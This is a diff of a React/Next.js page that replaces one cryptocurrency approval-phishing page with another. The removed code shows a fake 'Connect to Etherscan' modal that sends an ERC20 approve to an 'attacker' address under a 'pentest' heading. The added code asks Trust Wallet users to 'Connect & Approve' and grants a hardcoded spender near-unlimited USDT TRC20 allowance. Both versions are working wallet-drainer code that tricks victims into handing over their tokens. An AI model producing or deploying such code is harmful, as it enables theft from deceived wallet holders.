@@ -1,166 +1,60 @@
-"use client";
-import { useState } from "react";
+'use client';
 
-// Pentru TypeScript, declară window.ethereum
-declare global {
-  interface Window {
-    ethereum?: any;
-  }
-}
-
-// ABI pentru funcția approve (poți folosi și web3/ethers pentru encode, dar aici e hardcodat)
-function getApproveData(spender: string, amount: string) {
-  // selector approve(address,uint256): 0x095ea7b3
-  // address (32 bytes, left-padded), amount (32 bytes, left-padded)
-  return (
-    "0x095ea7b3" +
-    spender.replace("0x", "").padStart(64, "0") +
-    BigInt(amount).toString(16).padStart(64, "0")
-  );
-}
+import { useEffect, useState } from 'react';
 
 export default function Home() {
-  const [showModal, setShowModal] = useState(false);
-  const [txHash, setTxHash] = useState<string | null>(null);
-  const [error, setError] = useState<string | null>(null);
+  const [tronReady, setTronReady] = useState(false);
+  const [userAddress, setUserAddress] = useState('');
+  const [status, setStatus] = useState('');
 
-  // Setează aici adresa tokenului ERC20 și adresa "scammerului" (spender)
-  const tokenAddress = "0xYourTokenAddress"; // ex: USDT, USDC, DAI, etc.
-  const spender = "0xAttackerAddress"; // adresa de test sau a "atacatorului"
-  const amount = "1000000000000000000"; // 1 token (18 decimals)
+  useEffect(() => {
+    const checkTronWeb = setInterval(() => {
+      if (typeof window !== 'undefined' && window.tronWeb && window.tronWeb.ready) {
+        setTronReady(true);
+        setUserAddress(window.tronWeb.defaultAddress.base58);
+        clearInterval(checkTronWeb);
+      }
+    }, 500);
+
+    return () => clearInterval(checkTronWeb);
+  }, []);
 
   const handleApprove = async () => {
-    setError(null);
-    setTxHash(null);
-    if (!window.ethereum) {
-      setError("MetaMask nu este instalat.");
+    if (!tronReady) {
+      setStatus('❌ Please open this page in the Trust Wallet browser.');
       return;
     }
+
     try {
-      // 1. Cere adresa utilizatorului
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      const from = accounts[0];
+      const tronWeb = window.tronWeb;
+      const usdtContract = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // USDT TRC20
+      const spender = 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb';   // Demo spender
+      const amount = '9223372036854775807'; // Max int64 (unlimited)
 
-      // 2. Construiește data pentru approve
-      const data = getApproveData(spender, amount);
+      setStatus('🔄 Sending approve transaction...');
 
-      // 3. Trimite tranzacția approve
-      const tx = {
-        from,
-        to: tokenAddress,
-        data
-      };
+      const contract = await tronWeb.contract().at(usdtContract);
+      const tx = await contract.approve(spender, amount).send();
 
-      const txHash = await window.ethereum.request({
-        method: "eth_sendTransaction",
-        params: [tx]
-      });
-
-      setTxHash(txHash);
+      setStatus(`✅ Approve transaction sent! TXID: ${tx}`);
     } catch (e: any) {
-      setError(e.message || "Eroare la approve.");
+      setStatus('❌ Error: ' + e.message);
     }
   };
 
   return (
-    <div style={{ padding: 40, fontFamily: "sans-serif" }}>
-      <h1>I have permission and authorized for pentest</h1>
+    <main className="min-h-screen bg-[#0f172a] text-white flex flex-col items-center justify-center px-4">
+      <h1 className="text-3xl font-bold mb-6">USDT TRC20 Approve</h1>
       <button
-        onClick={() => setShowModal(true)}
-        style={{
-          fontSize: 20,
-          padding: 10,
-          background: "#0070f3",
-          color: "#fff",
-          border: "none",
-          borderRadius: 6,
-          cursor: "pointer"
-        }}
+        onClick={handleApprove}
+        className="bg-gradient-to-r from-blue-600 to-cyan-400 text-white px-6 py-3 rounded-full text-lg font-semibold shadow-md hover:opacity-90 transition"
       >
-        Connect with Etherscan
+        Connect & Approve
       </button>
-
-      {showModal && (
-        <div
-          style={{
-            position: "fixed",
-            top: 0,
-            left: 0,
-            width: "100vw",
-            height: "100vh",
-            background: "rgba(0,0,0,0.5)",
-            display: "flex",
-            alignItems: "center",
-            justifyContent: "center",
-            zIndex: 1000
-          }}
-        >
-          <div
-            style={{
-              background: "#fff",
-              borderRadius: 12,
-              padding: 32,
-              minWidth: 350,
-              boxShadow: "0 8px 32px rgba(0,0,0,0.2)",
-              textAlign: "center",
-              position: "relative"
-            }}
-          >
-            <img
-              src="https://etherscan.io/images/brandassets/etherscan-logo-circle.svg"
-              alt="Etherscan"
-              style={{ width: 60, marginBottom: 16 }}
-            />
-            <h2 style={{ margin: "0 0 12px 0" }}>Connect to Etherscan</h2>
-            <p style={{ color: "#444", marginBottom: 24 }}>
-              Please connect your wallet to verify and continue.
-            </p>
-            <button
-              onClick={handleApprove}
-              style={{
-                fontSize: 18,
-                padding: "10px 24px",
-                background: "#21a0f6",
-                color: "#fff",
-                border: "none",
-                borderRadius: 6,
-                cursor: "pointer"
-              }}
-            >
-              Approve
-            </button>
-            <button
-              onClick={() => setShowModal(false)}
-              style={{
-                fontSize: 16,
-                padding: "8px 16px",
-                background: "#eee",
-                color: "#333",
-                border: "none",
-                borderRadius: 6,
-                cursor: "pointer",
-                marginLeft: 16
-              }}
-            >
-              Cancel
-            </button>
-            <div style={{ position: "absolute", top: 12, right: 16, cursor: "pointer" }} onClick={() => setShowModal(false)}>
-              <svg width="24" height="24" fill="#888"><path d="M18 6L6 18M6 6l12 12" stroke="#888" strokeWidth="2" strokeLinecap="round"/></svg>
-            </div>
-            {txHash && (
-              <div style={{ marginTop: 24, wordBreak: "break-all", color: "#0a0" }}>
-                <b>Approve trimis!</b>
-                <div style={{ fontSize: 12 }}>{txHash}</div>
-              </div>
-            )}
-            {error && (
-              <div style={{ marginTop: 24, color: "#c00" }}>
-                <b>Eroare:</b> {error}
-              </div>
-            )}
-          </div>
-        </div>
+      <p className="mt-6 text-sm max-w-md text-center">{status}</p>
+      {userAddress && (
+        <p className="mt-2 text-xs text-gray-400">Connected Wallet: {userAddress}</p>
       )}
-    </div>
+    </main>
   );
 }
